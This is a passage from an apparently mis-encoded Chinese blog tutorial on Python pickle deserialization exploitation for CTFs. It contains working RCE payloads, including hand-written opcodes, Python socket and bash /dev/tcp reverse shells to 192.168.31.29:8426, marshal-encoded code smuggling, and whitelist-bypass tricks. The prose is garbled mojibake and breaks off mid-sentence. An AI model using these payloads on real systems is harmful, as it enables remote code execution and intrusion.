ä¸ªå‘¨æœ«çš„ctfç”šè‡³è¿ç­¾åˆ°éƒ½æ²¡ç­¾ï¼Œå¤ç°ä¹Ÿæ˜¯ä¸€æ‹–å†æ‹–ï¼Œæ‹–åˆ°ç¯å¢ƒéƒ½å…³å®Œäº†ï¼ŒæŒºåæ‚”çš„ï¼Œæ˜¯è‡ªå·±çš„é—®é¢˜ã€‚\nåœ¨åæ€å’Œè°ƒæ•´äº†ï¼Œå—¯ã€‚\n","date":"2021-08-18T17:07:55+08:00","permalink":"https://amiaaaz.github.io/2021/08/18/ractf2021-wp/","section":"posts","tags":["wp"],"title":"RACTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"åºåˆ—åŒ–\u0026amp;ååºåˆ—åŒ– åœ¨pythonä¸­æœ‰å¥½å‡ ä¸ªå†…ç½®æ¨¡å—éƒ½å¯ä»¥å¹²åºåˆ—åŒ–\u0026amp;ååºåˆ—åŒ–è¿™ä¸ªäº‹ï¼Œæ¯”å¦‚json, pickle/cpickle, shelve, marshalï¼Œè€Œæœ¬æ–‡åé¢æ¶‰åŠåˆ°çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œè‹¥æ— ç‰¹æ®Šè¯´æ˜ï¼ŒæŒ‡çš„éƒ½æ˜¯pickleã€‚\npickleåçš„å¯¹è±¡ä»¥äºŒè¿›åˆ¶å­—èŠ‚æµå­˜å‚¨ï¼Œèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œæ¯”å¦‚\n None ã€ True å’Œ False æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•° strã€byteã€bytearray åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰ å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•° å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±» __dict__ å±æ€§å€¼æˆ– __getstate__() å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰  å½“ç„¶ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚æ–‡ä»¶å¯¹è±¡å’Œç½‘ç»œå¥—æ¥å­—å¯¹è±¡ä»¥åŠä»£ç å¯¹è±¡å°±ä¸å¯ä»¥ã€‚\nå¯¹äºä¸€ä¸ªObjectï¼Œå¯ä»¥é€šè¿‡é‡å†™object.__reduce__()å‡½æ•°ï¼Œä½¿å…¶è¢«åºåˆ—åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œï¼›æ­¤å‡½æ•°ä¼šè¿”å›ä¸€ä¸ª(callable, ([para1, para2, ...])[, ...])çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚\npickleçš„å¸¸ç”¨æ–¹æ³•æœ‰dumps(), loads()å’Œdump(), load()ï¼Œä¸å¸¦sçš„éœ€è¦çš„å‚æ•°æ˜¯æ–‡ä»¶å¥æŸ„ï¼Œè€Œå¸¦sçš„æ‰€éœ€è¦çš„å‚æ•°æ˜¯å­—ç¬¦ä¸²ã€‚\nè¯´åˆ°pickleä¸å¾—ä¸è°ˆçš„æ˜¯opcodeï¼Œå³PVM(python virtual machine)çš„æ“ä½œç ï¼Œå®ƒå¯ä»¥è¢«PVMçš„è§£æå¼•æ“è§£é‡Šå¤„ç†ã€‚ç›®å‰opcodeæœ‰å¤šä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼ˆä½†å‘ä¸‹å…¼å®¹ï¼‰ï¼Œå…¶ä¸­py2å’Œpy3åºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸åŒçš„ï¼Œå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æ—¶æŒ‡å®šåè®®ç‰ˆæœ¬ã€‚\nimport pickle a={\u0026#39;1\u0026#39;: 1, \u0026#39;2\u0026#39;: 2} for i in range(4): print(f\u0026#39;ver_{i}\u0026#39;,pickle.dumps(a,protocol=i)) # python3è¾“å‡º protocol\u0026lt;=5 ver_0: b\u0026#39;(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.\u0026#39; ver_1: b\u0026#39;}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_2: b\u0026#39;\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_3: b\u0026#39;\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_4: b\u0026#39;\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; ver_5: b\u0026#39;\\x80\\x05\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; # python2è¾“å‡º protocal\u0026lt;=2 ver_0: (dp0 S\u0026#39;1\u0026#39; p1 I1 sS\u0026#39;2\u0026#39; p2 I2 s. ver_1: }q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. ver_2: ï¿½\u0002}q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. 0å·ç‰ˆæœ¬åºåˆ—åŒ–çš„ç»“æœçœ‹èµ·æ¥å¯è¯»æ€§å¾ˆå¼º éƒ½æ˜¯å¯è§†çš„å­—ç¬¦ï¼Œæ“ä½œç ä¹Ÿæ¯”è¾ƒç›´æ¥åœ°æš´éœ²å‡ºæ¥ï¼Œé‡ç‚¹å…³æ³¨å‡ ä¸ªï¼š\n   Opcode Mnemonic Description     ( MARK Push a mark object onto the stack   S STRING string   I INT Push integer or bool; decimal string argument   l LIST build a list from topmost stack items   d DICT build a dict from stack items   } EMPTY_DICT Push empty dict   t TUPLE Build a tuple from topmost stack items   ) EMPTY_TUPLE Push empty tuple   c GLOBAL Push self.find_class(module, args); 2 string args   R REDUCE Apply callable to argtuple, both on stack   b BUILD call __setstate__ or __dict__.update()   i INST build \u0026amp; push class instance   o OBJ build \u0026amp; push class instance   . STOP Every pickle ends with STOP    ä½¿ç”¨**pickletools**å¯ä»¥å°†opcodeè½¬åŒ–ä¸ºè‚‰çœ¼å¯è¯»å–çš„å½¢å¼\nimport pickletools data=b\u0026#34;\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;q\\x01\\x85q\\x02Rq\\x03.\u0026#34; pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL \u0026#39;builtins exec\u0026#39; 17: q BINPUT 0 19: X BINUNICODE \u0026#34;key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;\u0026#34; 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 å¯ä»¥åˆ©ç”¨çš„æ–¹å‘\u0026amp;æ€è·¯ pickleçš„åº”ç”¨åœºæ™¯å…¶å®å¾ˆå¹¿æ³›\n è§£æè®¤è¯token, sessionæ—¶ï¼›å‚è§ï¼šæŒé˜…iReaderæŸç«™Pythonæ¼æ´æŒ–æ˜ï¼ˆä¸€ä¸ªredis+pythonååºåˆ—åŒ–çš„æ —å­ å¯èƒ½å°†å¯¹è±¡pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶ å¯èƒ½å°†å¯¹è±¡pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“ å¯èƒ½ä¼šé€šè¿‡å‚æ•°ä¼ é€’ç»™ç¨‹åºï¼›å‚è§ï¼šsqlmapçš„ä»£ç æ‰§è¡Œæ¼æ´  è¿™é‡Œè¯´ä¸€ä¸‹ç¬¬ä¸€ç‚¹ï¼Œflaské…åˆredisåœ¨æœåŠ¡ç«¯å­˜å‚¨sessionï¼ˆä»¥pickleåºåˆ—åŒ–å½¢å¼è¿›è¡Œå­˜å‚¨ï¼‰ï¼Œå¦‚æœé€šè¿‡cookieè¿›è¡Œè¯·æ±‚session_idæ—¶ï¼Œsessionç§çš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ã€‚ç†è®ºä¸Šæ²¡é—®é¢˜ï¼Œä½†å¦‚æœå‡ºç°redisçš„æœªæˆæƒè®¿é—®ï¼Œå°±å¯ä»¥é€šè¿‡è‡ªå·±è®¾è®¡æ¶æ„çš„sessionï¼Œç„¶åå†è®¾ç½®cookieå»è¯·æ±‚sessionæ—¶ï¼Œæˆ‘ä»¬è‡ªå®šçš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œè¾¾åˆ°äº†rceçš„ç›®çš„ã€‚\næ„é€ ååºåˆ—åŒ–çš„payloadç¦»ä¸å¼€__reduce__è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼ˆä¸Šæ–‡ç®€å•çš„æåˆ°è¿‡ï¼‰ï¼Œå®ƒæ˜¯æ–°å¼ç±»ï¼ˆå†…ç½®ç±»ï¼‰ç‰¹æœ‰çš„æ–¹æ³•ï¼ˆå…³äºæ›´å¤špythonå…ƒç±»ç›¸å…³çš„çŸ¥è¯†å¯ä»¥å‚è€ƒstackoverflowçš„è¿™ç¯‡å¸–å­ï¼šWhat are metaclasses in Python?ï¼‰\nâ€”â€”â€”â€”åœ¨python2æœ‰ä¸¤ç§å£°æ˜ç±»çš„æ–¹å¼ï¼Œå¹¶ä¸”å®ƒä»¬å®ä¾‹åŒ–çš„å¯¹è±¡æ€§è´¨æ˜¯ä¸åŒçš„\npython3ä¸­æ¶ˆé™¤äº†ä¸¤è€…çš„åŒºåˆ«ï¼Œè¡¨ç°ä¸ºç¬¬äºŒç§\nå›åˆ°å…³äº__reduce__çš„é—®é¢˜ï¼Œåªè¦åœ¨æ–°å¼ç±»ä¸­å®šä¹‰ä¸€ä¸ª __reduce__ æ–¹æ³•ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åºåˆ—åŒ–çš„ä½¿ç”¨è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨__reduce__ ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–ã€‚æŒ‡å®šçš„å…³é”®å°±åœ¨äºè¯¥æ–¹æ³•çš„è¿”å›å€¼ä¸Šï¼šä¸€ä¸ªcallableå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯ ([para1, para2, ...])[, ...])ï¼Œè¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„ï¼›æœ€ç®€å•çš„ä¾‹å­æ˜¯return (os.system, ('ls',))ã€‚__reduce__ æ–¹æ³•ä¸opcodeä¸­çš„RæŒ‡ä»¤ç å…³ç³»å¯†åˆ‡ï¼Œå¯ä»¥è¯´PVMçš„RæŒ‡ä»¤ç å°±æ˜¯__reduce__çš„è¿”å›å€¼çš„ä¸€ä¸ªåº•å±‚å®ç°ã€‚\næ­¤å¤„ä¸Šä¸€ä¸ªç®€å•çš„å°æ —å­ # shell.pickle cos system (S\u0026#39;/bin/sh\u0026#39; tR. ä¸Šé¢æ‰‹å†™çš„opcodeæˆåŠŸè¿”å›äº†shçš„shellï¼›è€Œé€šè¿‡dumpså’Œloadså®ç°åˆ™æ˜¯è¿™æ ·ï¼›æˆ‘ä»¬æ‰§è¡Œçš„ä»£ç éƒ½åœ¨__reduce__ä¸­\n# py2 import pickle import os class A(object): def __reduce__(self): a = \u0026#39;/bin/sh\u0026#39; return (os.system,(a,)) a = A() test = pickle.dumps(a) print test pickle.loads(test) ä¹Ÿé¡ºåˆ©è¿”å›äº†shellï¼Œå¾ˆå®¹æ˜“å‘ç°è·Ÿä¸Šé¢æ‰‹å†™çš„opcodeå¹¶æ— å·®å¼‚ï¼Œè€Œè¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ„é€ æ—¶çš„__reduce__å‡½æ•°çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥rceï¼Œåå¼¹shellä¹‹ç±»çš„ã€‚\nå¦ä¸€ä¸ªåå¼¹shellçš„å°æ —å­ import pickle import os class A(object): def __reduce__(self): a = \u0026#34;\u0026#34;\u0026#34;python2 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.31.29\u0026#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34; return (os.system,(a,)) a=A() result = pickle.dumps(a) pickle.loads(result) # æˆ–è€…æœ€ç®€å•çš„æ‰‹å†™opcode ä¸ç”¨ç‰¹æ„æ„é€ class A() cos system (S\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; tR. å‚è€ƒï¼šLinuxåå¼¹shellï¼ˆä¸€ï¼‰æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘ | Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨\n  æ —å­1 - [DasCTF 0721] easyweb   ä¹‹å‰å†™è¿‡äº†ï¼Œåœ¨å¯¹sessionçš„å¤„ç†æ—¶ä½¿ç”¨äº†pickleï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„çš„sessionåå¼¹shellï¼›ä¹Ÿæ²¡æœ‰ç‰¹æ®Šçš„è¿‡æ»¤å’Œé™åˆ¶ï¼Œpayloadæ€ä¹ˆå†™éƒ½è¡Œ\n ç”¨Marshalåºåˆ—åŒ–ä»»æ„ä»£ç å¯¹è±¡ å¦‚æœåªåœ¨__reduce__ä¸­ç”¨-cå‚æ•°æ‰§è¡Œä»£ç çš„è¯ï¼Œé‡åˆ°ä¸€äº›è‡ªå®šå‡½æ•° åœ¨æ ¼å¼ä¸Šå°±ä¼šæ¯”è¾ƒéº»çƒ¦\nå‰é¢æåˆ°pickleä¸èƒ½åºåˆ—åŒ–ä»£ç å¯¹è±¡ï¼Œæ¥ä¸ªå®ä¾‹\n# py2 import pickle def foo(): import os def fib(n): if n\u0026lt;=1: return n return fib(n-1)+fib(n-2) print \u0026#39;fib(10)=\u0026#39;,fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) pickle.dumps(foo.func_code) ä½†ä¹Ÿä¸æ˜¯ç»è·¯ä¸€æ¡ï¼ŒMarshalå¯ä»¥è®©è¿™æ®µä»£ç åºåˆ—åŒ–\n# py2 import marshal import base64 def foo(): import os def fib(n): if n \u0026lt;= 1: return n return fib(n-1) + fib(n-2) print \u0026#39;fib(10) =\u0026#39;, fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) code_serialized = base64.b64encode(marshal.dumps(foo.func_code)) print code_serialized # YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B ç°åœ¨å¾—åˆ°äº†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒè¢«ååºåˆ—åŒ–æ—¶æ‰§è¡Œï¼Œä½†æ˜¯ç›´æ¥å°†ä»–æ”¾å…¥__reduce__è¿”å›éƒ¨åˆ†ä¼¼ä¹å¹¶ä¸å¯ä»¥ï¼Œ__reduce__æ˜¯è°ƒç”¨callableæ¥æ‰§è¡Œå‚æ•°ä¹‹ç±»çš„ï¼Œè€Œæˆ‘ä»¬æ„é€ å¥½çš„æœ¬èº«å°±æ˜¯callableï¼Œå¸Œæœ›å®ƒæ‰§è¡Œè€Œä¸æ˜¯ä½œä¸ºå¦ä¸€ä¸ªcallableçš„å‚æ•°ï¼›è¿™æ—¶å°±éœ€è¦ç›´æ¥ä»PVMæ“ä½œç çš„å±‚çº§è¿›è¡Œæ„é€ äº†ã€‚\nâ€”â€”â€”â€”å…¶å®æˆ‘è§‰å¾—æ›´é€šä¿—çš„ç†è§£æ˜¯è¿™æ ·å¯ä»¥ä¸æŠŠè¦æ‰§è¡Œçš„ä»£ç é™åˆ¶åœ¨return (os.system,(a,))è¿™æ ·å¼çš„æ¡†æ¶ä¸­ï¼Œè€Œæ˜¯å¯ä»¥è‡ªç”±çš„æ‰§è¡Œä»£ç ï¼Œæˆ–è€…è¯´å°±æ˜¯å¦ä¸€ç§å½¢å¼çš„pker\næˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å…¶å®æ˜¯ï¼ˆåˆ©ç”¨åˆ°python oopçš„ç‰¹æ€§ï¼Œé€šè¿‡types.FunctionTyle(func_code,globals(),â€™â€™)()æ¥åŠ¨æ€åœ°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå‚è§ï¼šå®˜æ–¹æ–‡æ¡£ï¼‰\n(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), \u0026#39;\u0026#39;))() æˆ–è€…æ›´å¯è¯»ä¸€äº›\ncode_str = base64.b64decode(code_enc) code = marshal.loads(code_str) func = types.FunctionType(code, globals(), \u0026#39;\u0026#39;) func() æ¥ä¸‹æ¥å°±æ˜¯æ‰‹åŠ¨æ„é€ opcodeçš„æ—¶å€™äº†ï¼Œå›æƒ³ä¹‹å‰è¿”å›ä¸€ä¸ªç®€å•çš„shellæ—¶çš„opcode\ncos system (S\u0026#39;/bin/sh\u0026#39; tR. å¼€å¤´çš„cåé¢è·Ÿçš„æ˜¯å¼•å…¥çš„æ¨¡å—ï¼Œæ¢è¡Œä¹‹åæ˜¯å‡½æ•°ï¼Œå†æ¢è¡Œä¹‹åæ˜¯æ‰§è¡Œçš„è¯­å¥ï¼›æ ¹æ®è¿™ä¸ªç»“æ„æŠŠmarshalå’Œb64åŠ è¿›å»\ncmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtR è€Œglobals()å¯ä»¥åœ¨__builtin__æ¨¡å—ä¸­å¼•å…¥\n{}{} c__builtin__ globals (tR æŠŠä¸Šé¢çš„ç¼åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆçš„payloadï¼Œæ³¨æ„æ·»åŠ (rR.\nctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR. æ„é€ è¿™ä¸ªäººçœ‹ç€è´¹åŠ²çš„payloadçš„æ¨¡æ¿~ï¼ˆæ¥æºå‚è§ï¼šArbitrary code execution with Python picklesï¼‰\n# py2 import marshal import base64 def foo(): pass # Your code here print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) ç”¨pickleæ‰§è¡Œä¸€ä¸‹é‚£ä¸²payloadçœ‹çœ‹æ•ˆæœ\næˆåŠŸè¿”å›äº†æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ç»“æœå’Œä¸€ä¸ªshell\nåŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå¯ä»¥ç”¨Marshal+b64çš„æ–¹å¼åå¼¹shellï¼ˆç”¨æ¨¡æ¿ç”Ÿæˆopcode\nimport marshal import base64 def foo(): import os a = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; # print \u0026#39;hold on...\u0026#39; os.system(a) print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) â€”â€”â€”â€”æˆ–è€…ä¸‹é¢è¿™ä¸ªæ¨¡æ¿ä¹Ÿå¯ä»¥è¾¾åˆ°ä¸Šé¢çš„æ•ˆæœï¼ˆæ‰§è¡Œä»£ç  è€Œä¸åŒ…å«ç±»å’Œå‡½æ•°ï¼‰ï¼ˆæ¥æºï¼špickle_compiler.py\ntry: import cPickle as pickle except ImportError: import pickle from sys import argv def picklecompiler(sourcefile): sourcecode = file(sourcefile).read() return \u0026#34;c__builtin__\\neval\\n(c__builtin__\\ncompile\\n(%sS\u0026#39;\u0026lt;payload\u0026gt;\u0026#39;\\nS\u0026#39;exec\u0026#39;\\ntRtR.\u0026#34; % (pickle.dumps( sourcecode )[:-4],) def usage(): print \u0026#39;\u0026#39;\u0026#39;usage: python %sfilename\u0026#39;\u0026#39;\u0026#39; % argv[0] if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) == 2: print picklecompiler(argv[1]) else: usage() å·¥å…·äºŒè¿ - é€šè¿‡pkeræ„é€ opcode åŸç†å‚è§ï¼šé€šè¿‡ASTæ¥æ„é€ Pickle opcode - è‡ªåŠ¨åŒ–æ„é€ ï¼Œåˆ©ç”¨äº†æŠ½è±¡è¯­æ³•æ ‘\npkerä¼šç”¨åˆ°GLOBAL, INST, OBJè¿™ä¸‰ç§ç‰¹æ®Šå‡½æ•°å’Œä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼›ä¸‹é¢æ˜¯pkerçš„ç®€å•å°æ —å­ï¼ˆæ›´å¤šä½¿ç”¨è¯´æ˜è¯¦è§ä¸Šé¢çš„é“¾æ¥ï¼‰\n  å…¨å±€å˜é‡è¦†ç›–\n  # è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥secretæ¨¡å—ä¸­çš„nameå’Œcategoryæ¨¡å— ecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;1\u0026#39; secret.category = \u0026#39;2\u0026#39;   # è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡ game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = \u0026#39;123\u0026#39;     å‡½æ•°æ‰§è¡Œ\n  # é€šè¿‡b\u0026#39;R\u0026#39;è°ƒç”¨ __reducce__æ–¹æ³• s = \u0026#39;whoami\u0026#39; system = GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;) system(s) return   # é€šè¿‡b\u0026#39;i\u0026#39;è°ƒç”¨ INST(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;whoami\u0026#39;)   # é€šè¿‡b\u0026#39;c\u0026#39;å’Œb\u0026#39;o\u0026#39;è°ƒç”¨ OBJ(GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;), \u0026#39;whoami\u0026#39;)   # å¤šå‚æ•°è°ƒç”¨å‡½æ•° INST(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;[, param0, param1...]) OBJ(GLOBAL(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;)[, param0, param1...])     å®ä¾‹åŒ–å¯¹è±¡ï¼ˆç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼‰\n  animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal   animal = OBJ(GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;), \u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal   animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;) animal.name=\u0026#39;1\u0026#39; animal.category=\u0026#39;2\u0026#39; return animal     å…ˆå¯¹é¢˜ç›®æœ‰å¤§æ¦‚æ€è·¯ï¼Œç„¶åè¾…ä»¥å·¥å…·~å¥½è€¶\nå·¥å…·äºŒè¿ - anapickle å…¶å®ä¸€ä¸ªå¹´é¾„å¾ˆå¤§çš„è„šæœ¬äº†ï¼Œæ”¯æŒpython2.3ã€‚ã€‚ã€‚ã€‚ä½†æ˜¯åŒ…å«äº†å¾ˆå¤špayloadï¼Œå¯ä»¥çµæ´»è¿ç”¨~\nbypass!!! å¯¹ç±»å‹çš„æ£€æŸ¥ å¯ä»¥åœ¨å·²ç»æ„é€ å¥½çš„opcodeåé¢å»æ‰.å†ç»­ä¸Šç›¸åº”çš„å¯¹è±¡çš„opcodeï¼Œä½œä¸ºæ ˆé¡¶çš„å€¼ä¾›æ£€æŸ¥\né™åˆ¶b'c'å¯¹æ¨¡å—çš„å¼•å…¥ - find_class()çš„é‡å†™ ä¿®æ”¹find_class()ä¼šå¼•å…¥å‡½æ•°\u0026amp;æ¨¡å—çš„ç™½åå•ï¼Œä¸€å®šç¨‹åº¦ä¸Šè§£å†³pickleçš„å®‰å…¨æ€§é—®é¢˜ï¼›ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¼šè°ƒç”¨find_class()çš„æ£€æŸ¥ï¼š\n opcodeè§’åº¦ï¼šå‡ºç°c, i, b'\\x93'ä¼šè°ƒç”¨ pythonè§’åº¦ï¼šfind_class()åªä¼šåœ¨è§£æopcodeæ—¶è°ƒç”¨ä¸€æ¬¡ï¼Œåªè¦ç»•è¿‡opcodeçš„æ‰§è¡Œè¿‡ç¨‹ï¼Œä¹‹åå†äº§ç”Ÿçš„å‡½æ•°åœ¨é»‘åå•ä¸­ä¹Ÿä¸ä¼šæ‹¦æˆªï¼ˆæ¯”å¦‚é€šè¿‡__import__æ¥ç»•è¿‡ï¼‰  \u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥__main__å¼€å¤´çš„æ¨¡å— â€œé€šè¿‡GLOBALæŒ‡ä»¤å¼•å…¥çš„å˜é‡å¯ä»¥çœ‹ä½œæ˜¯åŸå˜é‡çš„å¼•ç”¨ï¼Œæˆ‘ä»¬åœ¨æ ˆä¸Šä¿®æ”¹å®ƒçš„å€¼ï¼Œä¹Ÿä¼šä¿®æ”¹åŸå˜é‡â€ï¼ŒåŸºäºè¿™ä¸€åŸç†ï¼Œå½“cæŒ‡ä»¤åªå…è®¸__main__æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¼•å…¥__main__.blueï¼ˆblueè§é¢˜è¡Œäº‹ ä¸Šä¸‹æ–‡ä¸­ä¼šæå‰å¼•å…¥ï¼‰è¿™ä¸ªmoduleï¼Œå†å°†ä¸€ä¸ªdictå‹å…¥æ ˆï¼Œå†…å®¹æ˜¯{'name': 'rua', 'grade': 'www'}ï¼›ä¹‹åæ‰§è¡ŒBUILDæŒ‡ä»¤ï¼Œå°†ä¼šæ”¹å†™__main__.blue.nameå’Œ __main__.blue.gradeï¼Œæ­¤æ—¶å·²ç»æ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦çš„å˜é‡è¦†ç›–ã€‚ä¹‹åå¼¹æ‰æ ˆé¡¶ï¼Œç°åœ¨ä¸ºç©ºæ ˆï¼Œæ‹¼æ¥ä¸Šæ­£å¸¸çš„Studentå¯¹è±¡åºåˆ—åŒ–åçš„opcodeã€‚æ­¤æ—¶çš„å®Œæ•´opcodeåœ¨è¢«ååºåˆ—åŒ–æ—¶ï¼Œæ ˆé¡¶æ˜¯æ­£å¸¸çš„Studentå¯¹è±¡ï¼Œè€Œè¢«æ‰§è¡Œæ—¶å´ä¼šå…ˆæ‰§è¡Œä¸€éå‰é¢çš„è¿‡ç¨‹ï¼Œé€ 